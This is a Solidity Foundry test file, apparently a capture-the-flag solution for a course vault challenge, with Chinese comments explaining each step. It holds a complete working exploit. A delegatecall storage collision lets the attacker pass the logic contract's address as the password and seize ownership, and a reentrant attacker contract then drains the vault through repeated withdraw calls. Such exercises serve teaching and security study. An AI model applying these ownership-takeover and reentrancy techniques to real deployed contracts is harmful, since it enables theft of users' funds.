// Copy from https://github.com/OpenSpace100/openspace_ctf/blob/main/test/Vault.t.sol

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/W5D2/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    ReentrantAttacker public attacker;

    address owner = address(1);
    address player = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(player, 1 ether);
        vm.startPrank(player);

        console.log("Contract balance before attack:", address(vault).balance);

        // 当通过 delegatecall 调用 VaultLogic.changeOwner 时，
        // VaultLogic 合约中的 password 变量存储槽对应的是 Vault 合约的 slot 1，即 logic 地址。
        // 所以我们直接使用 logic 地址作为密码

        bytes32 fakePassword = bytes32(uint256(uint160(address(logic))));

        // 通过 fallback 函数触发 delegatecall，修改 Vault 合约的 owner
        (bool success,) = address(vault).call(
            abi.encodeWithSignature(
                "changeOwner(bytes32,address)", // changeOwner 函数选择器
                fakePassword, // 使用 logic 地址作为密码
                player // 新的owner地址(攻击者)
            )
        );
        require(success, "Failed to change owner");

        // 验证攻击者已成为 owner
        require(vault.owner() == player, "Attack failed: not owner");
        console.log("Successfully became owner");

        // 启用提现功能
        vault.openWithdraw();
        require(vault.canWithdraw(), "Withdraw not enabled");
        console.log("Withdraw enabled");

        // 执行重入攻击
        console.log("Starting reentrant attack...");
        attacker = new ReentrantAttacker(payable(address(vault)));
        attacker.attack{value: 0.01 ether}();

        console.log("Contract balance after attack:", address(vault).balance);
        console.log("Attacker contract balance:", attacker.getBalance());

        // 验证攻击成功
        require(vault.isSolve(), "solved");
        console.log("Attack successful!");
        vm.stopPrank();
    }
}

contract ReentrantAttacker {
    Vault public vault;

    constructor(address payable _vault) {
        vault = Vault(_vault);
    }

    function attack() public payable {
        vault.deposite{value: 0.01 ether}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
